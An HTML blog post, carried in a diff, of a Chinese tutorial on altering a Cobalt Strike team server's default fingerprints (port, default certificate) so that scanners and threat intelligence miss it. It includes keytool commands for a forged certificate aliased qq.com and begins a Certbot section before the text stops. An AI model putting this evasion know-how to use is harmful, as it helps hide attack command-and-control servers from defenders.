@@ -1,0 +1,781 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>CS-Cobalt Strike修改特征 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 38.95K                代码: 34.06K, 文本: 2.08K               预计阅读时间: 2.62 小时            什么是特征特征 : 人或事物可供识别的特殊的象征或标志, cobalt strike也有属于自己的特征 , 比如默认开放的端口号是50050 , 自带证书里面有cobalt strike字符等 为什么要修改特">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS-Cobalt Strike修改特征">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/09/25/3c3f9499/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 38.95K                代码: 34.06K, 文本: 2.08K               预计阅读时间: 2.62 小时            什么是特征特征 : 人或事物可供识别的特殊的象征或标志, cobalt strike也有属于自己的特征 , 比如默认开放的端口号是50050 , 自带证书里面有cobalt strike字符等 为什么要修改特">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726309.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726289.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726192.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726550.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726298.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726470.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726920.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409260834819.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409260834924.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261117454.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261130985.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727210.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727323.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727420.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727093.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727300.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727890.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727483.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728955.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728750.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728711.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728208.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728680.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728502.png">
+<meta property="article:published_time" content="2024-09-25T09:31:49.000Z">
+<meta property="article:modified_time" content="2024-09-26T03:31:22.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Cobalt Strike">
+<meta property="article:tag" content="后渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726309.png">
+  
+  
+  
+  <meta name="keywords" content="Cobalt Strike,后渗透">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：Cobalt Strike</span></div><div class="widget-body"><a class="item" href="/2024/09/24/3c3f9499/"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item active" href="/2024/09/25/3c3f9499/"><span class="title">CS-Cobalt Strike修改特征</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/09/26/da146604/"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/10/28/ce454855/"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/09/24/3c3f9499/">Cobalt Strike</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-09-25T09:31:49.000Z">2024-09-25</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-26T03:31:22.000Z">2024-09-26</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>CS-Cobalt Strike修改特征</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 38.95K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 34.06K, 文本: 2.08K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 2.62 小时</p>
+    </div>
+    </div>
+
+<h2 id="什么是特征"><a href="#什么是特征" class="headerlink" title="什么是特征"></a>什么是特征</h2><p>特征 : 人或事物可供识别的特殊的象征或标志,</p>
+<p><code>cobalt strike</code>也有属于自己的特征 , 比如默认开放的端口号是50050 , 自带证书里面有<code>cobalt strike</code>字符等</p>
+<h2 id="为什么要修改特征"><a href="#为什么要修改特征" class="headerlink" title="为什么要修改特征"></a>为什么要修改特征</h2><p>因为cs服务器如果默认特征不进行修改的话 , 很容易被搜索引擎或者威胁情报标记成木马远控服务器 , 以及进行一些特征的修改就算ip地址暴露了 , 也不能直接肯定这个ip是木马远控 , 提高自身的隐藏性</p>
+<h2 id="如何修改特征"><a href="#如何修改特征" class="headerlink" title="如何修改特征"></a>如何修改特征</h2><p>修改特征是针对cs服务端进行特征的修改 , 客户端不需要修改</p>
+<p><strong>牢记 : cs服务器需要的时候再开启 , 平常不需要的时候就关闭</strong></p>
+<h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><p><code>sudo vim teamserver</code> </p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726309.png" data-fancybox="true"/></div></div>
+
+<h3 id="修改默认证书"><a href="#修改默认证书" class="headerlink" title="修改默认证书"></a>修改默认证书</h3><blockquote>
+<p>推荐付费ssl证书</p>
+<p>1.购买域名,申请免费的ssl证书</p>
+<p>2.修改teamserver证书密码</p>
+</blockquote>
+<h4 id="查看默认证书"><a href="#查看默认证书" class="headerlink" title="查看默认证书"></a>查看默认证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认密码是 Microsoft</span></span><br><span class="line">┌──(kali㉿kali)-[/opt/CS/coablt_strike_4.5_jx]</span><br><span class="line">└─$ keytool -list -v -keystore cobaltstrike.store</span><br><span class="line"></span><br><span class="line">输入密钥库口令:  </span><br><span class="line">密钥库类型: PKCS12</span><br><span class="line">密钥库提供方: SunJSSE</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: cobaltstrike</span><br><span class="line">创建日期: 2022-6-13</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, ST=WA, C=US</span><br><span class="line">发布者: CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, ST=WA, C=US</span><br><span class="line">序列号: 21dcbd23</span><br><span class="line">生效时间: Mon Jun 13 15:52:02 CST 2022, 失效时间: Sun Sep 11 15:52:02 CST 2022</span><br><span class="line">证书指纹:</span><br><span class="line">         SHA1: B3:1E:0C:30:F4:33:57:31:8C:CF:D5:37:EF:32:0F:25:73:C7:AD:2C</span><br><span class="line">         SHA256: 2E:A0:BD:28:BD:F1:C9:F2:BC:BE:95:17:38:FB:6A:89:2E:B0:55:56:8C:D0:33:7F:FA:3F:77:BC:39:05:08:DF</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展: </span><br><span class="line"></span><br><span class="line"><span class="comment">#1: ObjectId: 2.5.29.14 Criticality=false</span></span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 8B B3 9D E3 74 52 5C 89   78 71 38 5A 37 73 2B 13  ....tR\.xq8Z7s+.</span><br><span class="line">0010: C4 9B E2 F3                                        ....</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726289.png" data-fancybox="true"/></div></div>
+
+<h4 id="生成伪造证书"><a href="#生成伪造证书" class="headerlink" title="生成伪造证书"></a>生成伪造证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> cobaltstrike.store cobaltstrike.store.bak</span><br><span class="line"></span><br><span class="line">sudo keytool -keystore cobaltstrike.store -storepass 1qazwsx -keypass 1qazwsx -genkeypair -keyalg RSA -<span class="built_in">alias</span> qq.com -dname <span class="string">&quot;CN=US, OU=qq.com, O=Software, L=Somewhere, ST=Cyberspace, C=CN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -keystore cobaltstrike.store: 指定密钥库文件的名称,</span></span><br><span class="line"><span class="comment"># -storepass 1qazwsx: 密钥库的密码,</span></span><br><span class="line"><span class="comment"># -keypass 1qazwsx: 生成的密钥的密码,</span></span><br><span class="line"><span class="comment"># -genkeypair: 生成密钥对(包含公钥和私钥),</span></span><br><span class="line"><span class="comment"># -keyalg RSA: 指定使用的密钥算法为 RSA,</span></span><br><span class="line"><span class="comment"># -alias qq.com: 指定密钥的别名为 qq.com,</span></span><br><span class="line"><span class="comment"># -dname &quot;CN=US, OU=qq.com, O=Software, L=Somewhere, ST=Cyberspace, C=CN&quot;: 生成密钥时使用的 DN(区分名),</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726192.png" data-fancybox="true"/></div></div>
+
+<p>然后在teamserver中修改以下两项即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Djavax.net.ssl.keyStore=./cobaltstrike.store</span><br><span class="line">-Djavax.net.ssl.keyStorePassword=1qazwsx</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726550.png" data-fancybox="true"/></div></div>
+
+<p>虽然伪装的证书可以欺骗fofa这类搜索引擎.但毕竟是自签名,使用ssl证书查询工具是查询不到颁发机构的.</p>
+<p>真正的证书是由证书签发机构颁布的.可以通过云服务器商免费申请ssl证书,不过国内要实名备案.</p>
+<p>推荐国外云服务提供商,他们不需要实名备案.</p>
+<p>证书格式推荐<code>jks</code>的证书,直接修改文件名.然后在<code>teamserver</code>中配置就可以了.</p>
+<h4 id="Certbot免费申请SSL证书"><a href="#Certbot免费申请SSL证书" class="headerlink" title="Certbot免费申请SSL证书"></a>Certbot免费申请SSL证书</h4><h5 id="安装Certbot"><a href="#安装Certbot" class="headerlink" title="安装Certbot"></a>安装Certbot</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install certbot</span><br></pre></td></tr></table></figure>
+
+<h5 id="添加A记录"><a href="#添加A记录" class="headerlink" title="添加A记录"></a>添加A记录</h5><p>添加需要申请域名的A记录,指向执行certbot脚本的服务器,</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726298.png" data-fancybox="true"/></div></div>
+
